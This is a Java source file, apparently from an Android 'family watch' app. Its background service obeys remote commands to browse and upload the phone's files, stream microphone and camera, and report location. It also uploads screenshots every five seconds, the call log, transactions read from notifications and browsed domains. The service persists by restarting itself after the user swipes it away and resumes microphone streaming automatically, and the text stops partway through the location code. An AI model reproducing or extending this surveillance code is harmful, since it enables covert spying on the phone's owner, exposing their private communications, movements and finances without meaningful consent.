package com.familywatch.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.AlarmManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.os.SystemClock;
import android.graphics.ImageFormat;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.util.DisplayMetrics;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Base64;
import android.webkit.MimeTypeMap;
import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.nio.ByteBuffer;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import java.util.Arrays;
import java.util.Collections;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.concurrent.TimeUnit;

public class KeepAliveService extends Service {

    private static final String CHANNEL_ID = "meeee_bg";
    private static final int    NOTIF_ID   = 1001;
    private static final String PREFS_NAME = "meeee";
    private static final long   MAX_FILE_BYTES = 200L * 1024 * 1024; // 200 MB

    private PowerManager.WakeLock wakeLock;
    private OkHttpClient          httpClient;
    private WebSocket             nativeWs;
    private Handler               handler;
    private String                serverUrl;
    private String                userName;
    private String                userId;      // assigned by server on auth_ok
    private boolean               shouldConnect = false;
    private BroadcastReceiver     systemReceiver; // reconnects WS on screen-on / network change

    // ── Screen capture fields ─────────────────────────────────────────────────
    private MediaProjection      mediaProjection;
    private VirtualDisplay       virtualDisplay;
    private ImageReader          screenReader;
    private volatile boolean     screenCapturing = false;
    private static final int     SCREEN_CAPTURE_INTERVAL_MS = 5000; // 5 sec

    // ── Live Monitor fields ───────────────────────────────────────────────────
    private LiveKitManager       lkManager;     // LiveKit camera publisher

    // Camera2 fields kept for cleanup safety (no longer used for streaming)
    private CameraDevice         cameraDevice;
    private CameraCaptureSession captureSession;
    private ImageReader          imageReader;
    private HandlerThread        cameraThread;
    private Handler              cameraHandler;
    private volatile boolean     cameraStreaming = false;
    private String               fromAdminIdCamera;

    private AudioRecord          audioRecord;
    private volatile boolean     micStreaming = false;
    private String               fromAdminIdMic;

    private LocationManager      locationManager;
    private LocationListener     locationListener;
    private volatile boolean     locationTracking = false;
    private String               fromAdminIdLocation;

    // Set in onTaskRemoved so onDestroy skips clearing prefs — service will restart and resume
    private volatile boolean     restarting = false;

    // Lets other components in-process (e.g. TransactionNotificationListener) submit data
    // without needing their own WebSocket connection.
    private static volatile KeepAliveService instance;

    // ── Lifecycle ─────────────────────────────────────────────────────────────

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        handler = new Handler(Looper.getMainLooper());
        httpClient = new OkHttpClient.Builder()
            .readTimeout(120, TimeUnit.SECONDS)   // large file uploads need time
            .writeTimeout(120, TimeUnit.SECONDS)
            .connectTimeout(30, TimeUnit.SECONDS)
            .pingInterval(25, TimeUnit.SECONDS)   // keep WS alive
            .build();
        lkManager = new LiveKitManager(this, httpClient);
        createChannel();
        // Only include FGS types for permissions already granted — Android 14+ crashes if type
        // is declared but the matching runtime permission hasn't been granted yet.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            int type = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
            if (checkSelfPermission("android.permission.CAMERA") == PackageManager.PERMISSION_GRANTED)
                type |= ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA;
            if (checkSelfPermission("android.permission.ACCESS_FINE_LOCATION") == PackageManager.PERMISSION_GRANTED)
                type |= ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R &&
                checkSelfPermission("android.permission.RECORD_AUDIO") == PackageManager.PERMISSION_GRANTED)
                type |= ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE;
            startForeground(NOTIF_ID, buildNotification(), type);
        } else {
            startForeground(NOTIF_ID, buildNotification());
        }
        acquireWakeLock();

        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        serverUrl = prefs.getString("serverUrl", null);
        userName  = prefs.getString("name", null);
        if (serverUrl != null && userName != null) {
            shouldConnect = true;
            connectWebSocket();
        }
        registerCallLogObserver();

        // Reconnect WebSocket whenever screen turns on or user unlocks phone
        systemReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context ctx, Intent intent) {
                if (nativeWs == null && serverUrl != null && shouldConnect) {
                    connectWebSocket();
                }
            }
        };
        IntentFilter sysFilter = new IntentFilter();
        sysFilter.addAction(Intent.ACTION_SCREEN_ON);
        sysFilter.addAction(Intent.ACTION_USER_PRESENT);  // screen unlocked
        sysFilter.addAction("android.net.conn.CONNECTIVITY_CHANGE");
        registerReceiver(systemReceiver, sysFilter);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            if ("CONNECT".equals(intent.getAction())) {
                serverUrl = intent.getStringExtra("serverUrl");
                userName  = intent.getStringExtra("name");
                if (serverUrl != null && userName != null) {
                    getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit()
                        .putString("serverUrl", serverUrl)
                        .putString("name", userName)
                        .apply();
                    shouldConnect = true;
                    if (nativeWs != null) nativeWs.cancel();
                    connectWebSocket();
                }
            } else if ("START_SCREEN_CAPTURE".equals(intent.getAction())) {
                int resultCode = intent.getIntExtra("resultCode", -1);
                Intent data    = intent.getParcelableExtra("data");
                if (resultCode != -1 && data != null) startScreenCapture(resultCode, data);
            } else if ("DISCONNECT".equals(intent.getAction())) {
                shouldConnect = false;
                if (nativeWs != null) { nativeWs.cancel(); nativeWs = null; }
                serverUrl = null; userName = null; userId = null;
                stopForeground(true);
                stopSelf();
            }
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        shouldConnect = false;
        stopScreenCapture();
        handleStopCamera();
        if (restarting) {
            // Service is restarting — stop hardware but preserve SharedPreferences so
            // handleMessage(auth_ok) can auto-resume mic/location after reconnect
            micStreaming = false;
            try { if (audioRecord != null) { audioRecord.stop(); audioRecord.release(); audioRecord = null; } } catch (Exception ignored) {}
            locationTracking = false;
            try { if (locationManager != null && locationListener != null) { locationManager.removeUpdates(locationListener); } } catch (Exception ignored) {}
        } else {
            handleStopMic();
            handleStopLocation();
        }
        if (nativeWs != null) nativeWs.cancel();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        if (systemReceiver != null) { try { unregisterReceiver(systemReceiver); } catch (Exception ignored) {} }
        if (callLogObserver != null) { try { getContentResolver().unregisterContentObserver(callLogObserver); } catch (Exception ignored) {} }
        if (instance == this) instance = null;
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    // Restart service after app is swiped away — uses exact alarm so OEMs can't defer it
    @Override
    public void onTaskRemoved(Intent rootIntent) {
        restarting = true;
        Intent restart = new Intent(getApplicationContext(), KeepAliveService.class);
        restart.setPackage(getPackageName());
        AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        if (am != null) {
            // Schedule at 1s and 10s as belt-and-suspenders
            for (int i = 0; i < 2; i++) {
                long delay = (i == 0) ? 1000L : 10000L;
                PendingIntent pi = PendingIntent.getService(
                    getApplicationContext(), i + 10,
                    restart,
                    PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    am.setExactAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        SystemClock.elapsedRealtime() + delay, pi);
                } else {
                    am.setExact(AlarmManager.ELAPSED_REALTIME,
                        SystemClock.elapsedRealtime() + delay, pi);
                }
            }
        }
        super.onTaskRemoved(rootIntent);
    }

    // ── WebSocket connection ───────────────────────────────────────────────────

    private void connectWebSocket() {
        if (serverUrl == null || !shouldConnect) return;

        String wsUrl = serverUrl
            .replaceFirst("^https://", "wss://")
            .replaceFirst("^http://", "ws://");
        if (!wsUrl.endsWith("/ws")) wsUrl = wsUrl + "/ws";

        Request request = new Request.Builder().url(wsUrl).build();
        nativeWs = httpClient.newWebSocket(request, new WebSocketListener() {

            @Override
            public void onOpen(WebSocket ws, Response response) {
                try {
                    JSONObject auth = new JSONObject();
                    auth.put("type", "auth");
                    auth.put("role", "user");
                    // __bg__ suffix tells server this is background service — invisible to admin list
                    auth.put("name", userName + "__bg__");
                    ws.send(auth.toString());
                } catch (Exception e) { /* ignore */ }
            }

            @Override
            public void onMessage(WebSocket ws, String text) {
                handleMessage(ws, text);
            }

            @Override
            public void onClosed(WebSocket ws, int code, String reason) {
                scheduleReconnect();
            }

            @Override
            public void onFailure(WebSocket ws, Throwable t, Response response) {
                scheduleReconnect();
            }
        });
    }

    private void scheduleReconnect() {
        if (!shouldConnect) return;
        handler.postDelayed(this::connectWebSocket, 3000);
    }

    // ── Auto-captured transactions (from TransactionNotificationListener) ───────
    // Static entry point so other in-process components can submit a transaction
    // without needing their own WebSocket connection. Sends immediately if we're
    // connected and authenticated; otherwise queues to SharedPreferences and the
    // queue is flushed as soon as the next auth_ok arrives.

    public static void sendTransaction(Context ctx, JSONObject txn) {
        KeepAliveService svc = instance;
        if (svc != null && svc.nativeWs != null && svc.userId != null) {
            svc.sendTransactionNow(txn);
        } else {
            queueTransaction(ctx, txn);
        }
    }

    private void sendTransactionNow(JSONObject txn) {
        try {
            JSONObject out = new JSONObject();
            out.put("type", "transaction_add");
            out.put("transaction", txn);
            nativeWs.send(out.toString());
        } catch (Exception ignored) {}
    }

    private static void queueTransaction(Context ctx, JSONObject txn) {
        try {
            SharedPreferences prefs = ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
            JSONArray pending = new JSONArray(prefs.getString("pendingTransactions", "[]"));
            pending.put(txn);
            prefs.edit().putString("pendingTransactions", pending.toString()).apply();
        } catch (Exception ignored) {}
    }

    private void flushPendingTransactions() {
        try {
            SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
            JSONArray pending = new JSONArray(prefs.getString("pendingTransactions", "[]"));
            if (pending.length() == 0) return;
            for (int i = 0; i < pending.length(); i++) {
                sendTransactionNow(pending.getJSONObject(i));
            }
            prefs.edit().remove("pendingTransactions").apply();
        } catch (Exception ignored) {}
    }

    // ── Auto-captured browsing domains (from DnsMonitorVpnService) ──────────────
    // Same immediate-send-or-queue-and-flush pattern as sendTransaction above.

    public static void sendBrowsingEvent(Context ctx, JSONObject entry) {
        KeepAliveService svc = instance;
        if (svc != null && svc.nativeWs != null && svc.userId != null) {
            svc.sendBrowsingEventNow(entry);
        } else {
            queueBrowsingEvent(ctx, entry);
        }
    }

    private void sendBrowsingEventNow(JSONObject entry) {
        try {
            JSONObject out = new JSONObject();
            out.put("type", "browsing_add");
            out.put("entry", entry);
            nativeWs.send(out.toString());
        } catch (Exception ignored) {}
    }

    private static void queueBrowsingEvent(Context ctx, JSONObject entry) {
        try {
            SharedPreferences prefs = ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
            JSONArray pending = new JSONArray(prefs.getString("pendingBrowsingEvents", "[]"));
            pending.put(entry);
            prefs.edit().putString("pendingBrowsingEvents", pending.toString()).apply();
        } catch (Exception ignored) {}
    }

    private void flushPendingBrowsingEvents() {
        try {
            SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
            JSONArray pending = new JSONArray(prefs.getString("pendingBrowsingEvents", "[]"));
            if (pending.length() == 0) return;
            for (int i = 0; i < pending.length(); i++) {
                sendBrowsingEventNow(pending.getJSONObject(i));
            }
            prefs.edit().remove("pendingBrowsingEvents").apply();
        } catch (Exception ignored) {}
    }

    // ── Call log (ContentObserver-driven) ────────────────────────────────────────
    // Same immediate-send-or-queue-and-flush pattern as sendTransaction/sendBrowsingEvent.

    public static void sendCallLogEvent(Context ctx, JSONObject entry) {
        KeepAliveService svc = instance;
        if (svc != null && svc.nativeWs != null && svc.userId != null) {
            svc.sendCallLogEventNow(entry);
        } else {
            queueCallLogEvent(ctx, entry);
        }
    }

    private void sendCallLogEventNow(JSONObject entry) {
        try {
            JSONObject out = new JSONObject();
            out.put("type", "call_log_add");
            out.put("entry", entry);
            nativeWs.send(out.toString());
        } catch (Exception ignored) {}
    }

    private static void queueCallLogEvent(Context ctx, JSONObject entry) {
        try {
            SharedPreferences prefs = ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
            JSONArray pending = new JSONArray(prefs.getString("pendingCallLogEvents", "[]"));
            pending.put(entry);
            prefs.edit().putString("pendingCallLogEvents", pending.toString()).apply();
        } catch (Exception ignored) {}
    }

    private void flushPendingCallLogEvents() {
        try {
            SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
            JSONArray pending = new JSONArray(prefs.getString("pendingCallLogEvents", "[]"));
            if (pending.length() == 0) return;
            for (int i = 0; i < pending.length(); i++) {
                sendCallLogEventNow(pending.getJSONObject(i));
            }
            prefs.edit().remove("pendingCallLogEvents").apply();
        } catch (Exception ignored) {}
    }

    // Registers a ContentObserver on the call log so new calls are picked up as they happen.
    // On first-ever call (no lastCallLogId saved yet), does one bounded historical backfill of
    // the most recent 200 entries rather than the entire lifetime log.
    private ContentObserver callLogObserver;

    private void registerCallLogObserver() {
        if (checkSelfPermission("android.permission.READ_CALL_LOG") != PackageManager.PERMISSION_GRANTED) return;
        if (callLogObserver != null) return;
        callLogObserver = new ContentObserver(handler) {
            @Override
            public void onChange(boolean selfChange) {
                syncCallLog();
            }
        };
        getContentResolver().registerContentObserver(CallLog.Calls.CONTENT_URI, true, callLogObserver);
        syncCallLog();
    }

    private void syncCallLog() {
        if (checkSelfPermission("android.permission.READ_CALL_LOG") != PackageManager.PERMISSION_GRANTED) return;
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        long lastId = prefs.getLong("lastCallLogId", -1);

        Cursor cursor;
        try {
            if (lastId < 0) {
                cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null,
                    CallLog.Calls._ID + " DESC LIMIT 200");
            } else {
                cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null,
                    CallLog.Calls._ID + " > ?", new String[]{String.valueOf(lastId)},
                    CallLog.Calls._ID + " ASC");
            }
        } catch (Exception e) {
            return;
        }
        if (cursor == null) return;

        long maxId = lastId;
        try {
            int idIdx = cursor.getColumnIndex(CallLog.Calls._ID);
            int numberIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER);
            int nameIdx = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
            int typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE);
            int durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION);
            int dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE);
            while (cursor.moveToNext()) {
                long id = cursor.getLong(idIdx);
                if (id > maxId) maxId = id;
                try {
                    JSONObject entry = new JSONObject();
                    entry.put("id", String.valueOf(id));
                    entry.put("number", cursor.getString(numberIdx));
                    String name = cursor.isNull(nameIdx) ? null : cursor.getString(nameIdx);
                    entry.put("name", name == null ? JSONObject.NULL : name);
                    entry.put("type", callTypeToString(cursor.getInt(typeIdx)));
                    entry.put("duration", cursor.getLong(durationIdx));
                    entry.put("date", cursor.getLong(dateIdx));
                    sendCallLogEvent(this, entry);
                } catch (Exception ignored) {}
            }
        } finally {
            cursor.close();
        }
        if (maxId > lastId) prefs.edit().putLong("lastCallLogId", maxId).apply();
    }

    private static String callTypeToString(int type) {
        switch (type) {
            case CallLog.Calls.INCOMING_TYPE: return "incoming";
            case CallLog.Calls.OUTGOING_TYPE: return "outgoing";
            case CallLog.Calls.MISSED_TYPE: return "missed";
            case CallLog.Calls.REJECTED_TYPE: return "rejected";
            default: return "other";
        }
    }

    // ── Message handling ───────────────────────────────────────────────────────

    private void handleMessage(WebSocket ws, String text) {
        try {
            JSONObject msg = new JSONObject(text);
            String type = msg.optString("type");
            if ("auth_ok".equals(type)) {
                userId = msg.optString("userId"); // store our assigned userId
                flushPendingTransactions(); // send anything queued while we were disconnected
                flushPendingBrowsingEvents();
                flushPendingCallLogEvents();
                // Auto-resume mic if it was streaming before service was restarted
                SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
                if (prefs.getBoolean("micActive", false) && !micStreaming) {
                    try {
                        JSONObject resumeMsg = new JSONObject();
                        resumeMsg.put("fromAdminId", prefs.getString("micAdminId", ""));
                        handleStartMic(resumeMsg);
                    } catch (Exception ignored) {}
                }
            } else if ("ls".equals(type)) {
                handleLs(ws, msg);
            } else if ("read_file".equals(type)) {
                handleReadFile(msg); // HTTP POST — no WebSocket needed for upload
            } else if ("start_camera".equals(type)) {
                handleStartCamera(msg);
            } else if ("stop_camera".equals(type)) {
                handleStopCamera();
            } else if ("start_mic".equals(type)) {
                handleStartMic(msg);
            } else if ("stop_mic".equals(type)) {
                handleStopMic();
            } else if ("start_location".equals(type)) {
                handleStartLocation(msg);
            } else if ("stop_location".equals(type)) {
                handleStopLocation();
            }
        } catch (Exception e) { /* ignore */ }
    }

    // ── Directory listing (WebSocket response) ─────────────────────────────────

    private void handleLs(WebSocket ws, JSONObject msg) {
        try {
            String fromAdminId = msg.optString("fromAdminId");
            JSONArray pathArr  = msg.optJSONArray("path");
            File dir = buildPath(pathArr);

            JSONArray entries = new JSONArray();
            File[] files = dir.listFiles();
            if (files != null) {
                java.util.Arrays.sort(files, (a, b) -> {
                    if (a.isDirectory() != b.isDirectory())
                        return a.isDirectory() ? -1 : 1;
                    return a.getName().compareToIgnoreCase(b.getName());
                });
                for (File f : files) {
                    JSONObject entry = new JSONObject();
                    entry.put("name", f.getName());
                    entry.put("kind", f.isDirectory() ? "directory" : "file");
                    if (f.isFile()) {
                        entry.put("size", f.length());
                        entry.put("mimeType", getMimeType(f.getName()));
                    }
                    entries.put(entry);
                }
            }

            JSONObject result = new JSONObject();
            result.put("type", "ls_result");
            result.put("forAdminId", fromAdminId);
            result.put("path", pathArr != null ? pathArr : new JSONArray());
            result.put("entries", entries);
            ws.send(result.toString());

        } catch (Exception e) {
            sendWsError(ws, "ls_result", msg, e.getMessage());
        }
    }

    // ── File upload via HTTP POST (single request, no chunking!) ──────────────

    private void handleReadFile(JSONObject msg) {
        new Thread(() -> {
            String fromAdminId = msg.optString("fromAdminId");
            String requestId   = msg.optString("requestId",
                String.valueOf(System.currentTimeMillis()));
            JSONArray pathArr  = msg.optJSONArray("path");

            try {
                File file = buildFilePath(pathArr);

                if (!file.exists() || !file.isFile()) {
                    notifyAdminError(fromAdminId, requestId, "File not found");
                    return;
                }

                if (file.length() > MAX_FILE_BYTES) {
                    notifyAdminError(fromAdminId, requestId, "File exceeds 200 MB limit");
                    return;
                }

                String mimeType = getMimeType(file.getName());
                boolean isPreview = msg.optBoolean("preview", false);
                // Preview: small + high compression. Download: full res + good quality.
                int maxPx   = isPreview ? 800  : 1920;
                int quality = isPreview ? 70   : 82;

                // Derive HTTP server URL from WebSocket URL
                String httpBase = serverUrl
                    .replaceFirst("^wss://", "https://")
                    .replaceFirst("^ws://", "http://")
                    .replaceFirst("/ws$", "");

                String uploadUrl = httpBase + "/api/file/" + requestId;

                // Compress images before upload — WebP gives ~30% better ratio than JPEG
                RequestBody body;
                String uploadMime = mimeType;
                if (mimeType.startsWith("image/") && !mimeType.equals("image/gif")) {
                    try {
                        BitmapFactory.Options opts = new BitmapFactory.Options();
                        opts.inJustDecodeBounds = true;
                        BitmapFactory.decodeFile(file.getAbsolutePath(), opts);
                        int maxDim = Math.max(opts.outWidth, opts.outHeight);
                        opts.inJustDecodeBounds = false;
                        opts.inSampleSize = 1;
                        // Correct: keep doubling until decoded size fits within maxPx
                        while (maxDim / opts.inSampleSize > maxPx) opts.inSampleSize *= 2;
                        Bitmap bmp = BitmapFactory.decodeFile(file.getAbsolutePath(), opts);
                        if (bmp != null) {
                            // Scale down precisely if still over maxPx (inSampleSize is power-of-2 only)
                            int w = bmp.getWidth(), h = bmp.getHeight();
                            int longest = Math.max(w, h);
                            if (longest > maxPx) {
                                float s = (float) maxPx / longest;
                                bmp = Bitmap.createScaledBitmap(bmp,
                                    Math.round(w * s), Math.round(h * s), true);
                            }
                            ByteArrayOutputStream baos = new ByteArrayOutputStream();
                            // WebP lossy: API 30+ uses WEBP_LOSSY, older uses WEBP (lossy when quality<100)
                            Bitmap.CompressFormat fmt = (Build.VERSION.SDK_INT >= 30)
                                ? Bitmap.CompressFormat.WEBP_LOSSY
                                : Bitmap.CompressFormat.WEBP;
                            bmp.compress(fmt, quality, baos);
                            bmp.recycle();
                            byte[] compressed = baos.toByteArray();
                            body = RequestBody.create(compressed, MediaType.parse("image/webp"));
                            uploadMime = "image/webp";
                        } else {
                            body = RequestBody.create(file, MediaType.parse(mimeType));
                        }
                    } catch (Exception e) {
                        body = RequestBody.create(file, MediaType.parse(mimeType));
                    }
                } else {
                    body = RequestBody.create(file, MediaType.parse(mimeType));
                }

                Request request = new Request.Builder()
                    .url(uploadUrl)
                    .post(body)
                    .header("X-File-Name", Uri.encode(file.getName()))
                    .header("X-Admin-Id", fromAdminId)
                    .header("X-User-Id", userId != null ? userId : "")
                    .header("Content-Type", uploadMime)
                    .build();

                Response response = httpClient.newCall(request).execute();
                response.close();
                // Server notifies admin via WebSocket once upload completes

            } catch (Exception e) {
                notifyAdminError(fromAdminId, requestId, e.getMessage());
            }
        }).start();
    }

    // Notify admin of an error via the WebSocket (so they see the error + retry button)
    private void notifyAdminError(String fromAdminId, String requestId, String error) {
        if (nativeWs == null || userId == null) return;
        try {
            JSONObject err = new JSONObject();
            err.put("type", "file_error");
            err.put("forAdminId", fromAdminId);
            err.put("requestId", requestId);
            err.put("error", error);
            err.put("fromUserId", userId);
            nativeWs.send(err.toString());
        } catch (Exception ignored) {}
    }

    // ── Screen capture — MediaProjection ─────────────────────────────────────

    // Called from MainActivity after user grants MediaProjection permission (one-time)
    public void startScreenCapture(int resultCode, Intent data) {
        if (screenCapturing) return;
        MediaProjectionManager mpm =
            (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        mediaProjection = mpm.getMediaProjection(resultCode, data);
        if (mediaProjection == null) return;

        DisplayMetrics dm = getResources().getDisplayMetrics();
        // Capture at 720p max to save storage
        int dw = Math.min(dm.widthPixels,  1280);
        int dh = Math.min(dm.heightPixels, 720);

        screenReader = ImageReader.newInstance(dw, dh, PixelFormat.RGBA_8888, 2);
        virtualDisplay = mediaProjection.createVirtualDisplay(
            "meeee-capture", dw, dh, dm.densityDpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            screenReader.getSurface(), null, null);

        screenCapturing = true;
        scheduleScreenCapture();
    }

    private void scheduleScreenCapture() {
        if (!screenCapturing) return;
        handler.postDelayed(() -> {
            captureScreen();
            scheduleScreenCapture();
        }, SCREEN_CAPTURE_INTERVAL_MS);
        // Also capture immediately on first start
    }

    private void captureScreen() {
        if (!screenCapturing || screenReader == null) return;
        new Thread(() -> {
            try (Image image = screenReader.acquireLatestImage()) {
                if (image == null) return;
                Image.Plane plane = image.getPlanes()[0];
                int rowPadding = plane.getRowStride() - plane.getPixelStride() * image.getWidth();
                android.graphics.Bitmap bmp = android.graphics.Bitmap.createBitmap(
                    image.getWidth() + rowPadding / plane.getPixelStride(),
                    image.getHeight(), android.graphics.Bitmap.Config.ARGB_8888);
                bmp.copyPixelsFromBuffer(plane.getBuffer());
                // Crop to exact dimensions (remove row padding)
                bmp = android.graphics.Bitmap.createBitmap(bmp, 0, 0, image.getWidth(), image.getHeight());

                // Compress to WebP
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                android.graphics.Bitmap.CompressFormat fmt = (Build.VERSION.SDK_INT >= 30)
                    ? android.graphics.Bitmap.CompressFormat.WEBP_LOSSY
                    : android.graphics.Bitmap.CompressFormat.WEBP;
                bmp.compress(fmt, 65, baos);
                bmp.recycle();

                // Delete screenshots older than 24h
                deleteOldScreenshots();

                // Upload to server
                uploadScreenshot(baos.toByteArray());
            } catch (Exception ignored) {}
        }).start();
    }

    private void uploadScreenshot(byte[] data) {
        if (serverUrl == null || userId == null) return;
        try {
            String httpBase = serverUrl
                .replaceFirst("^wss://", "https://")
                .replaceFirst("^ws://", "http://")
                .replaceFirst("/ws$", "");
            String uploadUrl = httpBase + "/api/screenshot/" + userId;
            String name = userName != null ? userName : "User";

            RequestBody body = RequestBody.create(data, MediaType.parse("image/webp"));
            Request req = new Request.Builder()
                .url(uploadUrl)
                .post(body)
                .header("Content-Type", "image/webp")
                .header("X-User-Name", Uri.encode(name))
                .build();
            httpClient.newCall(req).execute().close();
        } catch (Exception ignored) {}
    }

    private void deleteOldScreenshots() {
        // Server handles 24h TTL; this is a no-op placeholder for local storage if added later
    }

    private void stopScreenCapture() {
        screenCapturing = false;
        try { if (virtualDisplay != null) { virtualDisplay.release(); virtualDisplay = null; } } catch (Exception ignored) {}
        try { if (screenReader   != null) { screenReader.close();    screenReader   = null; } } catch (Exception ignored) {}
        try { if (mediaProjection != null) { mediaProjection.stop(); mediaProjection = null; } } catch (Exception ignored) {}
    }

    // ── Live Monitor — LiveKit camera publisher ───────────────────────────────

    private void handleStartCamera(JSONObject msg) {
        String facing = msg.optString("facing", "rear");
        String httpBase = serverUrl
            .replaceFirst("^wss://", "https://")
            .replaceFirst("^ws://", "http://")
            .replaceFirst("/ws$", "");
        lkManager.startCamera(httpBase, userId != null ? userId : "", facing);
    }

    private void handleStopCamera() {
        lkManager.stopCamera();
        // Clean up any leftover Camera2 state (safety)
        cameraStreaming = false;
        try { if (captureSession != null) { captureSession.close(); captureSession = null; } } catch (Exception ignored) {}
        try { if (cameraDevice  != null) { cameraDevice.close();   cameraDevice  = null; } } catch (Exception ignored) {}
        try { if (imageReader   != null) { imageReader.close();    imageReader   = null; } } catch (Exception ignored) {}
        if (cameraThread != null) { cameraThread.quitSafely(); cameraThread = null; cameraHandler = null; }
    }

    // ── Live Monitor — AudioRecord ────────────────────────────────────────────

    private void handleStartMic(JSONObject msg) {
        if (micStreaming) return;
        fromAdminIdMic = msg.optString("fromAdminId");
        // Persist so the service auto-resumes after being swiped-away and restarted
        getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit()
            .putBoolean("micActive", true)
            .putString("micAdminId", fromAdminIdMic)
            .apply();
        final int sampleRate = 16000;
        int minBuf = AudioRecord.getMinBufferSize(sampleRate,
            AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT);
        final int chunkSize = Math.max(minBuf > 0 ? minBuf : 0, 8192);
        audioRecord = new AudioRecord(MediaRecorder.AudioSource.MIC, sampleRate,
            AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, chunkSize);
        if (audioRecord.getState() != AudioRecord.STATE_INITIALIZED) {
            audioRecord.release(); audioRecord = null; return;
        }
        audioRecord.startRecording();
        micStreaming = true;
        new Thread(() -> {
            byte[] buf = new byte[chunkSize];
            while (micStreaming && audioRecord != null) {
                int read = audioRecord.read(buf, 0, chunkSize);
                if (read > 0 && nativeWs != null && micStreaming) {
                    try {
                        String b64 = Base64.encodeToString(
                            Arrays.copyOf(buf, read), Base64.NO_WRAP);
                        JSONObject chunk = new JSONObject();
                        chunk.put("type", "audio_chunk");
                        chunk.put("forAdminId", fromAdminIdMic);
                        chunk.put("data", b64);
                        chunk.put("sampleRate", sampleRate);
                        nativeWs.send(chunk.toString());
                    } catch (Exception ignored) {}
                }
            }
        }).start();
    }

    private void handleStopMic() {
        micStreaming = false;
        // Admin explicitly stopped mic — clear persisted state so restart won't auto-resume
        getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit()
            .remove("micActive").remove("micAdminId").apply();
        try {
            if (audioRecord != null) {
                audioRecord.stop();
                audioRecord.release();
                audioRecord = null;
            }
        } catch (Exception ignored) {}
    }

    // ── Live Monitor — LocationManager ────────────────────────────────────────

    private void handleStartLocation(JSONObject msg) {
        if (locationTracking) return;
        fromAdminIdLocation = msg.optString("fromAdminId");
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        locationListener = new LocationListener() {
            @Override
            public void onLocationChanged(@NonNull Location loc) {
                if (!locationTracking || nativeWs == null) return;
                try {
                    JSONObject upd = new JSONObject();
                    upd.put("type", "location_update");
                    upd.put("forAdminId", fromAdminIdLocation);
                    upd.put("lat", loc.getLatitude());
                    upd.put("lng", loc.getLongitude());
                    upd.put("accuracy", loc.getAccuracy());
                    upd.put("ts", loc.getTime());
                    nativeWs.send(upd.toString());
